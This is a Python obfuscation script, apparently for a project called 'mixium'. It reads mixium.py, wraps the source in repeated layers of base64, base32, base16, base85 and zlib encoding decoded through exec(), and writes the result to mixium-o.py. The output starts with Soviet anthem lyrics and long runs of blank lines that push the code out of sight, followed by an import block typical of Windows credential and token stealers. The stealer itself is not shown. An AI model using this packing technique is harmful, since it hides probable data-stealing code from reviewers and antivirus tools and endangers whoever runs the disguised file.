import base64, codecs, random, os, zlib

def setup():
    global file_to_obfuscatestr
    global curdirectory
    global a
    global imports
    global prepped

    file_to_obfuscatestr = "mixium.py"

    curdirectory = os.path.dirname(os.path.abspath(__file__))

    file_to_obfuscate_open = open(curdirectory+"\\"+file_to_obfuscatestr, "r",encoding="UTF-8")
    a = str(file_to_obfuscate_open.read())
    file_to_obfuscate_open.close()


    imports = """
                                            #___COMFUSCATED___#   
                                            
                                            
                                            
                                            
                                                                                  
#                                 United Forever in Friendship and Labour,                  
#                                 Our mighty Republics will ever endure.                    
#                                 The Great Soviet Union will Live through the Ages.        
#                                 The Dream of a People their fortress secure.              

#                                 Long Live our Soviet Motherland,                          
#                                 Built by the People s mighty hand.                    
#                                 Long Live our People, United and Free.                    
#                                 Strong in our Friendship tried by fire.                   
#                                 Long may our Crimson Flag Inspire,                        
#                                 Shining in Glory for all Men to see.                      

#                                 Through Days dark and stormy where Great Lenin Lead us    
#                                 Our Eyes saw the Bright Sun of Freedom above              
#                                 and Stalin our Leader with Faith in the People,           
#                                 Inspired us to Build up the Land that we Love.            

#                                 Long Live our Soviet Motherland,                          
#                                 Built by the People s mighty hand.                    
#                                 Long Live our People, United and Free.                    
#                                 Strong in our Friendship tried by fire.                   
#                                 Long may our Crimson Flag Inspire,                        
#                                 Shining in Glory for all Men to see.                      

#                                 We fought for the Future, destroyed the invaders,         
#                                 and Brought to our Homeland the Laurels of Fame.          
#                                 Our Glory will live in the Memory of Nations              
#                                 and All Generations will Honour Her Name.                 

#                                 Long Live our Soviet Motherland,                          
#                                 Built by the People s mighty hand.                    
#                                 Long Live our People, United and Free.                    
#                                 Strong in our Friendship tried by fire.                   
#                                 Long may our Crimson Flag Inspire,                        
#                                 Shining in Glory for all Men to see.










































































































































































































































































import os
import re
import sys
import time
import shutil
import requests
import random
import warnings
import threading
import subprocess
from sys import executable, stderr
from base64 import b64decode
from json import loads, dumps
from zipfile import ZipFile, ZIP_DEFLATED
from sqlite3 import connect as sql_connect
from urllib.request import Request, urlopen
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
from Crypto.Cipher import AES
from json import loads as json_loads, load
from json import *
import socket
import uuid
import getpass



import zlib
import codecs
import base64
"""

    prepped = str(a.strip())

setup()


def obfuscation(file):
    bruh = codecs.encode(file)
    a = base64.b64encode(bruh)
    b = codecs.decode(a)
    c = r"exec(codecs.decode(base64.b64decode(r'"+b+"')))"

    bruh = codecs.encode(c)
    d = base64.b32encode(bruh)
    e = codecs.decode(d)
    f = r"exec(codecs.decode(base64.b32decode(r'"+e+"')))"

    bruh = codecs.encode(f)
    g = base64.b16encode(bruh)
    h = codecs.decode(g)
    ch = r"exec(codecs.decode(base64.b16decode(r'"+h+"')))"

    bruh = codecs.encode(ch)
    i = base64.b85encode(bruh)
    j = codecs.decode(i)
    k = r"exec(codecs.decode(base64.b85decode(r'"+j+"')))"

############################################################################ LOOPS

    bruh = codecs.encode(k)
    a = base64.b64encode(bruh)
    b = codecs.decode(a)
    c = r"exec(codecs.decode(base64.b64decode(r'"+b+"')))"

    bruh = codecs.encode(c)
    d = base64.b32encode(bruh)
    e = codecs.decode(d)
    f = r"exec(codecs.decode(base64.b32decode(r'"+e+"')))"

    bruh = codecs.encode(f)
    g = base64.b16encode(bruh)
    h = codecs.decode(g)
    ch = r"exec(codecs.decode(base64.b16decode(r'"+h+"')))"

    bruh = codecs.encode(ch)
    i = base64.b85encode(bruh)
    j = codecs.decode(i)
    k = r"exec(codecs.decode(base64.b85decode(r'"+j+"')))"

    bruh = codecs.encode(k)
    a = base64.b64encode(bruh)
    b = codecs.decode(a)
    c = r"exec(codecs.decode(base64.b64decode(r'"+b+"')))"

    bruh = codecs.encode(c)
    d = base64.b32encode(bruh)
    e = codecs.decode(d)
    f = r"exec(codecs.decode(base64.b32decode(r'"+e+"')))"

    bruh = codecs.encode(f)
    g = base64.b16encode(bruh)
    h = codecs.decode(g)
    ch = r"exec(codecs.decode(base64.b16decode(r'"+h+"')))"

    bruh = codecs.encode(ch)
    i = base64.b85encode(bruh)
    j = codecs.decode(i)
    k = r"exec(codecs.decode(base64.b85decode(r'"+j+"')))"

    bruh = codecs.encode(k)
    a = str(zlib.compress(bruh, 9))
    c = r"exec(codecs.decode(zlib.decompress("+"bytes("+a+")"+")))"


    W = imports+c

    try:
        creationoffile = open("mixium-o.py", "x",encoding="UTF-8")
        creationoffile.close()
    except Exception:
        pass

    creationoffile = open("mixium-o.py", "w",encoding="UTF-8")
    creationoffile.write(W)
    creationoffile.close()

obfuscation(prepped)